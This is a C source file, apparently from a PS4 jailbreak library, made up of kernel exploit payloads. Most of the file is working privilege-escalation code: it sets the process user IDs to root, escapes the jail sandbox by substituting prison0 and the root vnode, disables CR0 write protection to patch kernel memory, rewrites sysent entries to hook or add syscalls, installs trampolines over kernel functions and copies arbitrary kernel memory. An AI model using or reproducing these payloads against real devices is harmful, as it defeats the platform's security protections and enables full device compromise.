
#ifndef _KERNEL
	#define UNDEFKERNEL
	#define _KERNEL
#endif

#include <sys/types.h>
#include <sys/syscall.h>
#include <sys/systm.h>
#include <sys/param.h>
#include <sys/proc.h>
#include <sys/event.h>
#include <sys/kthread.h>
#include <sys/filedesc.h>
#include <sys/ucred.h>
#include <sys/malloc.h>
#include <vm/vm.h>
#include <vm/pmap.h>
#include <vm/vm_map.h>
#include <vm/vm_extern.h>
#include <sys/sched.h>
#include <sys/sysent.h>
#include <machine/specialreg.h>

#ifdef UNDEFKERNEL
	#undef _KERNEL
#endif

#undef offsetof
#include <kernel.h>
#include <ps4/kernel.h>

#include <ps4/internal/kernel.h>
#include <ps4/internal/kernelexploit.h>
#include <ps4/internal/kernelexploitpayload.h>
#include <ps4/internal/asmpayload.h>

static inline void ps4KernelCr0Set(uint64_t cr0) // load_cr0
{
	__asm__ volatile("movq %0, %%cr0" : : "r" (cr0));
}

static inline uint64_t ps4KernelCr0Get(void) // rcr0
{
	uint64_t cr0;
	__asm__ volatile("movq %%cr0, %0" : "=r" (cr0));
	return cr0;
}

static inline struct thread *ps4KernelCurrentThread(void)
{
	struct thread *td;
	__asm__ volatile("movq %%gs:0, %0;" : "=r"(td));
	return td;
}

int ps4KernelExploitPayloadUARTEnable(int argc, char **argv)
{
	unsigned char *fn;
	uint16_t *sf;
	fn = (unsigned char *)ps4KernelDlSym("bootparam_disable_console_output");
	sf = (uint16_t *)(0xffffffff00000000 | (uint64_t)*(uint32_t *)(fn + 4));
	//((uint64_t)fn[7]) << 24 | ((uint64_t)fn[6]) << 16 | ((uint64_t)fn[5]) << 8 | (uint64_t)fn[4]
	*sf = *sf & ~(1 << 15);
	return (int)sf;
}

int ps4KernelExploitPayloadGainRoot(int argc, char **argv)
{
	struct thread *td;
	struct ucred *cr;
	td = ps4KernelCurrentThread();
	cr = td->td_proc->p_ucred;
	cr->cr_uid = cr->cr_ruid = cr->cr_rgid = 0;
	//cr->cr_groups[0] = 0;
	return 0;
}

int ps4KernelExploitPayloadUnjail(int argc, char **argv)
{
	struct thread *td;
	struct filedesc	*fd;
	struct ucred *cr;
	td = ps4KernelCurrentThread();
	cr = td->td_proc->p_ucred;
	cr->cr_prison = (struct prison *)ps4KernelDlSym("prison0");
	fd = td->td_proc->p_fd;
	//fd->fd_cdir =
	fd->fd_rdir = fd->fd_jdir = *(struct vnode **)ps4KernelDlSym("rootvnode");
	return 0;
}

// need to do some more sce patching eventually ...
int ps4KernelExploitPayloadEscalatePrivileges(int argc, char **argv)
{
	//ps4KernelExploitPayloadUARTEnable(0, NULL);
	ps4KernelExploitPayloadGainRoot(0, NULL);
	ps4KernelExploitPayloadUnjail(0, NULL);
	return 0;
}

#ifdef LibPS4KernelNone
	#define copyin(...)
#endif

int ps4KernelExploitPayloadMalloc(int argc, char **argv)
{
	argv[0] = ps4KernelExecutableMemoryMalloc((size_t)argv[1]);
	return 0;
}

int ps4KernelExploitPayloadFree(int argc, char **argv)
{
	ps4KernelExecutableMemoryFree(argv[0]);
	return 0;
}

int ps4KernelExploitPayloadHookSyscall(int argc, char **argv)
{
    struct sysent *sy = ps4KernelDlSym("sysent");
    sy = &sy[(int)argv[0]];
	memset(sy, 0, sizeof(*sy));
    sy->sy_narg = (int)argv[1];
    sy->sy_call = (sy_call_t *)argv[2];
	//sy->sy_auevent = AUE_NULL;
	sy->sy_thrcnt = SY_THR_STATIC; //SY_THR_ABSENT
	return 0;
}

int ps4KernelExploitPayloadInstallRunSyscall(int argc, char **argv)
{
	struct sysent *sy = ps4KernelDlSym("sysent");
	unsigned long size = (unsigned long)ps4CallbackSyscallPayloadSize;
	void *addr =  ps4KernelExecutableMemoryMalloc(size);

	//sched_pin();
	ps4KernelCr0Set(ps4KernelCr0Get() & ~CR0_WP);
	copyin((void *)ps4CallbackSyscallPayload, (void *)addr, size);
	ps4KernelCr0Set(ps4KernelCr0Get() | CR0_WP);
	//sched_unpin();

	sy = &sy[SYS_ps4_kernel_run];
	memset(sy, 0, sizeof(*sy));
	sy->sy_narg = 3;
	sy->sy_call = (sy_call_t *)addr;
	sy->sy_thrcnt = SY_THR_STATIC;

	return 0;
}

int ps4KernelExploitPayloadHookFunction(int argc, char **argv)
{
	int64_t *addr = (int64_t *)((char *)argv[0] + 2);
	int r;
	ps4KernelCr0Set(ps4KernelCr0Get() & ~CR0_WP);
	r = copyin((void *)ps4TrampolinePayload, (char *)argv[0], (unsigned long)ps4TrampolinePayloadSize);
	*addr = (int64_t)argv[1];
	ps4KernelCr0Set(ps4KernelCr0Get() | CR0_WP);
	return r;
}

int ps4KernelExploitPayloadPatchToTruthFunction(int argc, char **argv)
{
	int r;
	ps4KernelCr0Set(ps4KernelCr0Get() & ~CR0_WP);
	r = copyin((void *)ps4TruthFunctionPayload, (void *)argv[0], (unsigned long)ps4TruthFunctionPayloadSize);
	ps4KernelCr0Set(ps4KernelCr0Get() | CR0_WP);
	return r;
}

/*
int ps4KernelExploitPayloadPoke(int argc, char **argv)
{
	void *kern = (void *)argv[0];
	void *user = (void *)argv[1];
	unsigned long size = (unsigned long)argv[3];
	int r;
	ps4KernelCr0Set(ps4KernelCr0Get() & ~CR0_WP);
	r = copyin(user, kern, size);
	ps4KernelCr0Set(ps4KernelCr0Get() | CR0_WP);
	return (int)r;
}

int ps4KernelExploitPayloadPeek(int argc, char **argv)
{
	void *kern = (void *)argv[0];
	void *user = (void *)argv[1];
	unsigned long size = (unsigned long)argv[3];
	int r;
	ps4KernelCr0Set(ps4KernelCr0Get() & ~CR0_WP);
	r = copyout(kern, user, size);
	ps4KernelCr0Set(ps4KernelCr0Get() | CR0_WP);
	return (int)r;
}
*/

int ps4KernelExploitPayloadMemcpy(int argc, char **argv)
{
	void *dest = (void *)argv[0];
	void *src = (void *)argv[1];
	unsigned long size = (unsigned long)argv[2];
	int r;

	int destisk = ((uint64_t)dest >> 48) > 0;
	int srcisk = ((uint64_t)src >> 48) > 0;

	 //FIXME: did not look if a simple memcpy would do ...
	ps4KernelCr0Set(ps4KernelCr0Get() & ~CR0_WP);
	if(destisk == 1 && srcisk == 1)
		r = memcpy(dest, src, size) != NULL;
	else if(destisk == 0 && srcisk == 1)
		r = copyout(src, dest, size);
	else if(destisk == 1 && srcisk == 0)
		r = copyin(src, dest, size);
	else //if(destisk == 0 && srcisk == 0) // not sure either
		r = memcpy(dest, src, size) != NULL;
	ps4KernelCr0Set(ps4KernelCr0Get() | CR0_WP);

	return r;
}
